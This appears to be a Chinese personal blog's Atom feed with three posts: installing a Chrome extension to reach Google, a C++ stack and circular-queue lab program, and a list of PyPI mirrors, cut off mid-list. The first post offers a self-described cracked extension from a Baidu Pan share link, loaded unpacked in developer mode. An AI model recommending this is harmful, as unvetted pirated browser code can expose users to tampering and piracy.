<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>夏日 の blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2020-04-07T09:09:19.685Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>夏日</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>谷歌访问之插件篇</title>
    <link href="http://yoursite.com/2020/04/07/%E8%B0%B7%E6%AD%8C%E8%AE%BF%E9%97%AE%E4%B9%8B%E6%8F%92%E4%BB%B6%E7%AF%87/"/>
    <id>http://yoursite.com/2020/04/07/%E8%B0%B7%E6%AD%8C%E8%AE%BF%E9%97%AE%E4%B9%8B%E6%8F%92%E4%BB%B6%E7%AF%87/</id>
    <published>2020-04-07T07:17:00.000Z</published>
    <updated>2020-04-07T09:09:19.685Z</updated>
    
    <content type="html"><![CDATA[<hr><blockquote><p>我们知道正常情况下我们无法直接访问谷歌，一般解决办法有使用代理和插件(类似代理)，今天我们先介绍通过一个插件访问谷歌</p></blockquote><h2 id="为什么要用谷歌搜索"><a href="#为什么要用谷歌搜索" class="headerlink" title="为什么要用谷歌搜索"></a>为什么要用谷歌搜索</h2><p>1.格局大小的区别，互联网和局域网的区别。你在google面前，可以看到整个互联网，而你打开百度，只看到的中国局域网。这是格局所限，百度几乎不可能改变这个现状。</p><p>2.google更有商业道德，用过百度的都知道，各种广告，竞价排名充斥着整个搜索界面，将用户想看到的内容放在第三页，甚至更靠后。而谷歌搜索出来，第一页甚至第一条就是你想看到的内容，没有任何竞价配排名广告，更不会出现莆田系的医院祸害用户。</p><h2 id="谷歌浏览器"><a href="#谷歌浏览器" class="headerlink" title="谷歌浏览器"></a>谷歌浏览器</h2><p>首先我们需要下载谷歌浏览器，地址：<a href="https://www.google.com/intl/zh-CN/chrome/" target="_blank" rel="noopener">https://www.google.com/intl/zh-CN/chrome/</a><br>直接可以访问不用代理即可下载</p><h2 id="谷歌访问助手"><a href="#谷歌访问助手" class="headerlink" title="谷歌访问助手"></a>谷歌访问助手</h2><p>资源下载地址：</p><p><a href="https://pan.baidu.com/s/1q6O16yBH2-MsILZb7Np7uA" target="_blank" rel="noopener">https://pan.baidu.com/s/1q6O16yBH2-MsILZb7Np7uA</a> </p><p>密码：ey1h<br>下载好后解压，移动到不容易误删的地方，我一般和谷歌浏览器放在一起。</p><p>然后我们打开拓展程序<img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200313182428463.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br>先打开右面的开发者模式，然后选择左面的加载已解压的拓展程序。<br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/2020031318252353.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br>然后选择刚才下载的文件夹<br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/2020031318265677.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br>这时浏览器会自动打开这个页面就说明我们安装好了<br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200313182732686.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br>接下来就可以愉快的使用谷歌搜索了。</p><h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><p>此插件为破解版的，谷歌网上商店有正版的但是会更改我们浏览器的主页，如有需要自行下载。</p><h2 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h2><p>后续会发些</p><ul><li>浏览器常用插件</li><li>插件访问外网</li><li>ssr访问外网 (我目前在用)</li><li>关于电脑使用的一些小技巧 </li></ul><p><strong>你的关注是我最大的动力。</strong></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;hr&gt;
&lt;blockquote&gt;
&lt;p&gt;我们知道正常情况下我们无法直接访问谷歌，一般解决办法有使用代理和插件(类似代理)，今天我们先介绍通过一个插件访问谷歌&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;为什么要用谷歌搜索&quot;&gt;&lt;a href=&quot;#为什么要用谷歌搜索&quot; cl
      
    
    </summary>
    
    
      <category term="日常办公" scheme="http://yoursite.com/categories/%E6%97%A5%E5%B8%B8%E5%8A%9E%E5%85%AC/"/>
    
    
  </entry>
  
  <entry>
    <title>实验三 栈和队列的操作</title>
    <link href="http://yoursite.com/2020/04/07/%E5%AE%9E%E9%AA%8C%E4%B8%89%20%E6%A0%88%E5%92%8C%E9%98%9F%E5%88%97%E7%9A%84%E6%93%8D%E4%BD%9C/"/>
    <id>http://yoursite.com/2020/04/07/%E5%AE%9E%E9%AA%8C%E4%B8%89%20%E6%A0%88%E5%92%8C%E9%98%9F%E5%88%97%E7%9A%84%E6%93%8D%E4%BD%9C/</id>
    <published>2020-04-07T07:17:00.000Z</published>
    <updated>2020-04-07T15:11:57.309Z</updated>
    
    <content type="html"><![CDATA[<hr><h1 id="实验性质：验证性实验"><a href="#实验性质：验证性实验" class="headerlink" title="实验性质：验证性实验"></a>实验性质：验证性实验</h1><h1 id="要求："><a href="#要求：" class="headerlink" title="要求："></a>要求：</h1><p>（1）编程实现栈的以下基本操作：建栈，取栈顶元素，入栈，出栈。<br>（2）编程实现队列的以下基本操作：建队列，取队头元素，入队，出队。</p><h1 id="目的："><a href="#目的：" class="headerlink" title="目的："></a>目的：</h1><p>（1）掌握栈的顺序存储结构、链式存储结构及其基本操作；<br>（2）掌握队列的顺序存储结构、链式存储结构及其基本操作。</p><h1 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXSIZE 100</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> SElemType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> QElemType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    SElemType *base;</span><br><span class="line">    SElemType *top;</span><br><span class="line">    <span class="keyword">int</span> stacksize;</span><br><span class="line">&#125;SqStack;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    QElemType *base;</span><br><span class="line">    <span class="keyword">int</span> front;</span><br><span class="line">    <span class="keyword">int</span> rear;</span><br><span class="line">&#125;SqQueue;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InitStack</span><span class="params">(SqStack &amp;S)</span></span>; <span class="comment">//顺序栈的初始化</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Push</span><span class="params">(SqStack &amp;S,<span class="keyword">int</span> v)</span></span>;<span class="comment">//顺序栈的入栈</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Pop</span><span class="params">(SqStack &amp;S)</span></span>; <span class="comment">//删除栈顶元素</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">GetTop</span><span class="params">(SqStack S)</span></span>; <span class="comment">//取栈顶元素</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DisplayS</span><span class="params">(SqStack S)</span></span>;    <span class="comment">//显示顺序栈元素</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InitQueue</span><span class="params">(SqQueue &amp;Q)</span></span>; <span class="comment">//循环队列的初始化</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">EnQueue</span><span class="params">(SqQueue &amp;Q,<span class="keyword">int</span> v)</span></span>; <span class="comment">//循环队列的入队</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DeQueue</span><span class="params">(SqQueue &amp;Q)</span></span>;   <span class="comment">//循环队列的出队</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">GetHead</span><span class="params">(SqQueue Q)</span></span>;    <span class="comment">//取循环队列的队头</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DisplayQ</span><span class="params">(SqQueue Q)</span></span>;    <span class="comment">//显示循环队列元素</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Menu</span><span class="params">()</span></span>;  <span class="comment">//文字菜单提示信息</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    SqStack S;</span><br><span class="line">    Menu();</span><br><span class="line">    InitStack(S);</span><br><span class="line">    SqQueue Q;</span><br><span class="line">    InitQueue(Q);</span><br><span class="line">    <span class="keyword">int</span> v,i;    <span class="comment">//插入元素的数值和操作代码</span></span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"请输入操作代码："</span>;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;i;</span><br><span class="line">    <span class="keyword">while</span>(<span class="literal">true</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">switch</span>(i)</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;<span class="string">"输入要插入的值："</span>;</span><br><span class="line">            <span class="built_in">cin</span>&gt;&gt;v;</span><br><span class="line">            Push(S,v);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            Pop(S);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            GetTop(S);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">            DisplayS(S);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;<span class="string">"输入要插入的值："</span>;</span><br><span class="line">            <span class="built_in">cin</span>&gt;&gt;v;</span><br><span class="line">            EnQueue(Q,v);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">            DeQueue(Q);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">            GetHead(Q);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">            DisplayQ(Q);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">9</span>:</span><br><span class="line">            system(<span class="string">"cls"</span>);</span><br><span class="line">            Menu();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">if</span>(i&lt;<span class="number">0</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">cout</span>&lt;&lt;<span class="string">"输入的位置非法，请重新输入"</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"请输入操作代码："</span>;</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InitStack</span><span class="params">(SqStack &amp;S)</span> <span class="comment">//顺序栈的初始化</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    S.base=<span class="keyword">new</span> SElemType[MAXSIZE];</span><br><span class="line">    <span class="keyword">if</span>(!S.base)</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"存储分配失败"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        S.top=S.base;   <span class="comment">//top初始化为base,空栈</span></span><br><span class="line">        S.stacksize=MAXSIZE;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Push</span><span class="params">(SqStack &amp;S,<span class="keyword">int</span> v)</span><span class="comment">//顺序栈的入栈</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(S.top-S.base==S.stacksize)</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"当前栈已满"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        *S.top++=v;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"入栈成功"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Pop</span><span class="params">(SqStack &amp;S)</span> <span class="comment">//删除栈顶元素</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(S.top==S.base)</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"当前栈为空栈,无法出栈"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        --S.top;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"出栈成功"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">GetTop</span><span class="params">(SqStack S)</span> <span class="comment">//取栈顶元素</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(S.top!=S.base)</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"栈顶元素为:"</span>&lt;&lt;*(S.top<span class="number">-1</span>)&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"当前栈为空栈"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DisplayS</span><span class="params">(SqStack S)</span>    <span class="comment">//显示顺序栈元素</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(S.top==S.base)</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"当前栈为空栈"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"栈中元素为"</span>;</span><br><span class="line">        <span class="keyword">while</span>(S.top!=S.base)</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;*--S.top&lt;&lt;<span class="string">" "</span>;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InitQueue</span><span class="params">(SqQueue &amp;Q)</span> <span class="comment">//循环队列的初始化</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Q.base=<span class="keyword">new</span> QElemType[MAXSIZE];</span><br><span class="line">    <span class="keyword">if</span>(!Q.base)</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"存储分配失败"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        Q.front=Q.rear=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">EnQueue</span><span class="params">(SqQueue &amp;Q,<span class="keyword">int</span> v)</span> <span class="comment">//循环队列的入队</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>((Q.rear+<span class="number">1</span>)%MAXSIZE==Q.front)</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"循环队列已满，无法插入"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        Q.base[Q.rear]=v;</span><br><span class="line">        Q.rear=(Q.rear+<span class="number">1</span>)%MAXSIZE;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"入队成功"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DeQueue</span><span class="params">(SqQueue &amp;Q)</span>   <span class="comment">//循环队列的出队</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(Q.front==Q.rear)</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"循环队列为空，无法出队"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        Q.front=(Q.front+<span class="number">1</span>)%MAXSIZE;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"出队成功"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">GetHead</span><span class="params">(SqQueue Q)</span>    <span class="comment">//取循环队列的队头</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(Q.front!=Q.rear)</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"队头为："</span>&lt;&lt;Q.base[Q.front]&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DisplayQ</span><span class="params">(SqQueue Q)</span>    <span class="comment">//显示循环队列元素</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(Q.front!=Q.rear)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(((Q.front+i)%MAXSIZE)!=Q.rear)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;Q.base[(Q.front+i)%MAXSIZE]&lt;&lt;<span class="string">" "</span>;</span><br><span class="line">            i++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"循环队列为空"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Menu</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"----------------------------------------"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"**by 夏日 https://blog.csdn.net/zss192**"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"----------------------------------------"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"1-----顺序栈入栈"</span>&lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"2-----顺序栈出栈"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"3-----取栈顶元素"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"4-----显示顺序栈元素"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"5-----循环队列入队"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"6-----循环队列出队"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"7-----取循环队列队头元素"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"8-----显示循环队列元素"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"9-----清屏"</span> &lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"   退出,输入一个负数！"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h1><p>本文章仅供个人复习使用，如有错误，请联系我更正。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;hr&gt;
&lt;h1 id=&quot;实验性质：验证性实验&quot;&gt;&lt;a href=&quot;#实验性质：验证性实验&quot; class=&quot;headerlink&quot; title=&quot;实验性质：验证性实验&quot;&gt;&lt;/a&gt;实验性质：验证性实验&lt;/h1&gt;&lt;h1 id=&quot;要求：&quot;&gt;&lt;a href=&quot;#要求：&quot; class=&quot;h
      
    
    </summary>
    
    
      <category term="数据结构" scheme="http://yoursite.com/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
    
  </entry>
  
  <entry>
    <title>windows下pip安装速度慢解决方法</title>
    <link href="http://yoursite.com/2020/04/07/windows%E4%B8%8Bpip%E5%AE%89%E8%A3%85%E9%80%9F%E5%BA%A6%E6%85%A2%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/"/>
    <id>http://yoursite.com/2020/04/07/windows%E4%B8%8Bpip%E5%AE%89%E8%A3%85%E9%80%9F%E5%BA%A6%E6%85%A2%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/</id>
    <published>2020-04-07T06:45:00.000Z</published>
    <updated>2020-04-07T09:09:26.321Z</updated>
    
    <content type="html"><![CDATA[<hr><h3 id="临时使用："><a href="#临时使用：" class="headerlink" title="临时使用："></a>临时使用：</h3><p>可以在使用pip的时候加参数-i <a href="https://pypi.tuna.tsinghua.edu.cn/simple" target="_blank" rel="noopener">https://pypi.tuna.tsinghua.edu.cn/simple</a></p><p>例如：pip install <strong>-i</strong> <a href="https://pypi.tuna.tsinghua.edu.cn/simple" target="_blank" rel="noopener">https://pypi.tuna.tsinghua.edu.cn/simple</a> pyspider，这样就会从清华这边的镜像去安装pyspider库。</p><h3 id="永久修改，一劳永逸："><a href="#永久修改，一劳永逸：" class="headerlink" title="永久修改，一劳永逸："></a>永久修改，一劳永逸：</h3><p><strong>国内源：</strong><br>新版ubuntu要求使用https源，要注意。</p><p>清华：<a href="https://pypi.tuna.tsinghua.edu.cn/simple" target="_blank" rel="noopener">https://pypi.tuna.tsinghua.edu.cn/simple</a></p><p>阿里云：<a href="http://mirrors.aliyun.com/pypi/simple/" target="_blank" rel="noopener">http://mirrors.aliyun.com/pypi/simple/</a></p><p>中国科技大学 <a href="https://pypi.mirrors.ustc.edu.cn/simple/" target="_blank" rel="noopener">https://pypi.mirrors.ustc.edu.cn/simple/</a></p><p>华中理工大学：<a href="http://pypi.hustunique.com/" target="_blank" rel="noopener">http://pypi.hustunique.com/</a></p><p>山东理工大学：<a 